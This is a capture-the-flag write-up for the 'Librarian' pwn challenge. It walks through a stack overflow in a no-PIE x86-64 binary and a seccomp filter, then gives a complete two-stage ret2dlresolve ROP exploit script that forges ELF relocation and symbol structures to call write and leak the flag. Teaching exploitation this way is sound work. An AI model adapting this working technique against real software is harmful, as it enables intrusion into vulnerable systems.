# IDA 2/4 — Librarian (ret2dlresolve)

**Flag:** `reentry{the_loader_is_the_library}`

| | |
|---|---|
| Category | pwn (x86-64, Linux) · 421 pts |
| Service | `nc 0.cloud.chals.io 18325` (offline now — event closed) |
| Files | [files/archive-terminal](files/archive-terminal), [files/libbridge.so](files/libbridge.so), [files/libc.so.6](files/libc.so.6), [files/ld-linux-x86-64.so.2](files/ld-linux-x86-64.so.2), [files/SERVICE_PROTOCOL.md](files/SERVICE_PROTOCOL.md) |

> **Challenge brief:** An archive terminal, stripped down to the point where it can no longer say
> anything. It reads a record, it can exit, and it loads its own proof into memory — but it
> imports nothing that can put a byte back on the wire. The proof is sitting in its address
> space. There is no function linked in that will print it. It still ships a loader, though.
> Loaders are in the business of finding functions. Ask it for one it was never given.

---

## 1. Recon

| File | Role |
|------|------|
| `archive-terminal` | main ELF (no-PIE, dynamic, stripped) |
| `libbridge.so` | library with the `bridge_*` functions |
| `libc.so.6` | glibc 2.36 |
| `ld-linux-x86-64.so.2` | the loader |
| `SERVICE_PROTOCOL.md` | the TCP protocol |

Binary properties:
- **No-PIE** — fixed base `0x400000` (all gadgets/sections at known addresses).
- No stack canary (on the vulnerable function; see below).
- Imports **only** 4 symbols from `libbridge.so`: `bridge_exit`, `bridge_load_flag`,
  `bridge_read_exact`, `bridge_lockdown`.

Writable sections of interest:

```
.arena  0x404020  0x101   <- the flag lands here (257 bytes)
.stage  0x405000  0x1000  <- empty writable scratch
.state  0x406000  0x0002
```

> **Verification note (static):** On `files/archive-terminal` I confirmed it is a no-PIE x86-64
> ELF, that its only `bridge_*` imports are exactly those four, and that the gadgets
> `pop rdi ; ret` / `pop rsi ; ret` / `pop rdx ; ret` sit at `0x40105d` / `0x40105f` / `0x401061`.
> The remote service is offline, so the end-to-end run cannot be reproduced now.

---

## 2. Protocol

1. The server sends a banner, then reads a byte stream.
2. The client sends a `u16le` length `L` (`73 ≤ L ≤ 512`), then exactly `L` bytes of the **first
   stage**.
3. *If the first stage calls the supplied exact-read primitive, the next bytes on the same
   connection are consumed as its second stage* (no length prefix).
4. On the intended path, the target writes 257 bytes: the flag + NUL padding.

This directly suggests a two-stage solution: overflow → ROP that pulls a second stage to a known
address.

---

## 3. Program logic

`main` (`0x4010bb`):

```text
bridge_load_flag(0x404020, 0x101)   ; load flag from getenv("FLAG") into .arena
bridge_lockdown()                   ; install a seccomp filter
<record-reading function @0x401066>
bridge_exit(1)
```

Record-reading function (`0x401066`):

```asm
sub    rsp, 0x40
bridge_read_exact(0, 0x406000, 2)   ; read u16le length L into .state
movzx  edx, word [0x406000]         ; L
cmp    edx, 0x49 ; jb fail          ; L >= 73
cmp    edx, 0x200 ; ja fail         ; L <= 512
lea    rsi, [rbp-0x40]              ; 64-byte buffer
bridge_read_exact(0, rbp-0x40, L)   ; <-- up to 512 B into a 64-byte buffer = OVERFLOW
leave ; ret
```

**Stack buffer overflow.** Buffer at `rbp-0x40`, saved RIP at `rbp+8` → return-address overwrite
offset = **72 bytes**. No canary + no-PIE = simple ROP.

Gadgets near `_start`:

```
0x40105d : pop rdi ; ret
0x40105f : pop rsi ; ret
0x401061 : pop rdx ; ret
```

---

## 4. Seccomp — what is allowed

`bridge_lockdown` installs a BPF filter via `prctl(PR_SET_NO_NEW_PRIVS)` +
`prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER)`. Decoded, it allows:

```
read(0), write(1), exit(60), exit_group(231), rt_sigreturn(15), uname(63), 64, 93, 94, 139
else -> KILL_PROCESS
```

**Key point:** `write` (nr=1) **is allowed**. The problem is not the syscall — it is that the
binary contains **no code that calls it** (no `write` in the PLT, no `syscall` instruction).

---

## 5. Idea — "ask the loader for a function it was never given"

This is the heart of the puzzle and the title *Librarian*:
- `libc.so.6` is loaded into the address space (as a dependency of `libbridge.so`).
- The dynamic loader (`ld.so`) resolves PLT symbols **by name**, searching the symbol tables of
  all loaded objects.
- So we can hand the loader a **forged request to resolve `"write"`** — a symbol the binary never
  imported — and it will find it in libc and call it.

This is **ret2dlresolve**. The conditions are ideal: glibc 2.36 with a classic SysV `.hash`, no
symbol versioning, no modern hardening in `_dl_fixup`.

### How the resolver works

`PLT[0]` (`0x401000`) pushes `GOT[1]` (link_map) and jumps to `GOT[2]` (`_dl_runtime_resolve`),
which calls `_dl_fixup(link_map, reloc_index)`:
1. `reloc = JMPREL + reloc_index * sizeof(Elf64_Rela)`
2. `symidx = R_SYM(reloc->r_info)`; `sym = &SYMTAB[symidx]`
3. name = `STRTAB + sym->st_name`
4. resolve the name across the whole scope, store in `reloc->r_offset`, then **jump to the
   resolved function with the original argument registers**.

There is no range check on `reloc_index` or `symidx`, so we can point them **outside** the real
tables, into memory we control.

---

## 6. The exploit

### Addresses (fixed base 0x400000)

```
JMPREL = 0x4003e0   SYMTAB = 0x400318   STRTAB = 0x400390
POP_RDI = 0x40105d  POP_RSI = 0x40105f  POP_RDX = 0x401061
bridge_read_exact@plt = 0x401030     PLT0 (resolver) = 0x401000     bridge_exit@plt = 0x401010
.arena (flag) = 0x404020   len = 257 (0x101)     .stage = 0x405000
```

### Why a second stage

The stack address is randomized (ASLR), so the forged `Elf64_Rela`/`Elf64_Sym`/string structures
must land at a **fixed** address → `.stage` (`0x405000`). But the overflow only writes the stack.
So **stage 1** (ROP) first calls `bridge_read_exact(0, 0x405000, N)` to pull **stage 2** (the
forged structures) from the socket into `.stage` — the "second stage" mechanism from the protocol.

### Index selection

- `reloc_index = ceil((0x405000 - JMPREL)/24) = 812` → fake `Rela` at `0x405000`.
- `sym_index` chosen so `SYMTAB + sym_index*24` falls in `.stage` (here `823`, `Sym` at `0x405040`).
- `"write\0"` just after the `Sym`; `st_name = string_addr - STRTAB`.
- `r_info = (sym_index << 32) | R_X86_64_JUMP_SLOT(7)`.
- `r_offset` = any writable scratch in `.stage` (here `0x405400`).

### Stage 1 chain (overflow)

```
[72 bytes padding]
; A: pull stage 2 into .stage
pop rdi ; 0
pop rsi ; 0x405000
pop rdx ; len(stage2)
bridge_read_exact@plt        ; 0x401030
; B: write(1, flag, 257) via dlresolve
pop rdi ; 1
pop rsi ; 0x404020
pop rdx ; 257
PLT0                         ; 0x401000  (-> resolver trampoline)
reloc_index                  ; 812
bridge_exit@plt              ; 0x401010  (return address after write)
```

The tail (`PLT0 ; reloc_index ; retaddr`) mirrors exactly what a normal PLT stub does
(`push index ; jmp plt0`), so `_dl_runtime_resolve` gets the correct `link_map` and our
`reloc_index`.

### Script

```python
import struct, socket, time
p64 = lambda x: struct.pack("<Q", x)
JMPREL=0x4003e0; SYMTAB=0x400318; STRTAB=0x400390
POP_RDI=0x40105d; POP_RSI=0x40105f; POP_RDX=0x401061
BRE=0x401030; PLT0=0x401000; BEXIT=0x401010
FLAG=0x404020; FLAGLEN=257; STAGE=0x405000

stage=bytearray(0x300)
reloc_index=-(-(STAGE-JMPREL)//24); A_rela=JMPREL+reloc_index*24
sym_index=-(-((A_rela+0x40)-SYMTAB)//24); A_sym=SYMTAB+sym_index*24
A_str=A_sym+24+8; st_name=A_str-STRTAB
stage[A_rela-STAGE:]=p64(STAGE+0x400)+p64((sym_index<<32)|7)+p64(0)
stage[A_sym-STAGE:A_sym-STAGE+24]=struct.pack("<IBBH",st_name,0x12,0,0)+p64(0)+p64(0)
stage[A_str-STAGE:A_str-STAGE+6]=b"write\x00"
stage2=bytes(stage[:A_str-STAGE+8])

c =b"A"*72
c+=p64(POP_RDI)+p64(0)+p64(POP_RSI)+p64(STAGE)+p64(POP_RDX)+p64(len(stage2))+p64(BRE)
c+=p64(POP_RDI)+p64(1)+p64(POP_RSI)+p64(FLAG)+p64(POP_RDX)+p64(FLAGLEN)
c+=p64(PLT0)+p64(reloc_index)+p64(BEXIT)

blob=struct.pack("<H",len(c))+c+stage2        # u16le L + stage1 + stage2
s=socket.create_connection(("0.cloud.chals.io",18325),timeout=30)
time.sleep(0.3); s.recv(4096)                 # banner
s.sendall(blob)                               # do NOT shutdown!
data=b""; s.settimeout(12)
try:
    while True:
        b=s.recv(4096)
        if not b: break
        data+=b
except socket.timeout: pass
print(data.split(b"\x00",1)[0].decode())
```

---

## 7. Local test

```bash
FLAG='FLAG{local_test}' ./ld-linux-x86-64.so.2 --library-path . ./archive-terminal < payload.bin | xxd
# -> 'FLAG{local_test}' + NUL padding to 257 bytes
```

`_start` does `and rsp, -16`, so stack alignment at the `write` call is deterministic and the
same locally and remotely (ASLR randomizes the page base, not the parity) — no `movaps` issues.

---

## 8. Trap: `shutdown`

The first remote try returned 0 bytes — caused by `socket.shutdown(SHUT_WR)` sent right after
`sendall`, racing the target's output. Removing it returns the flag cleanly. Both `write(1, …)`
and `write(0, …)` work, because the socket is duplicated on fd 0 and 1.

```
[banner] {"task":"archive-terminal","frame":"u16le+payload"}
reentry{the_loader_is_the_library}
```

🚩 **Flag:** `reentry{the_loader_is_the_library}`

The flag name is the lesson: **the loader still in the process is a full symbol-resolution engine
— it will hand you any function from any loaded object if you ask for it by name.** The binary
never imported `write`, but `ld.so` + ret2dlresolve found it anyway.

> **Previous:** [1 - Sleeper Decoy](1%20-%20Sleeper%20Decoy.md) · **Next:** [3 - CXTEA-F](3%20-%20CXTEA-F.md)
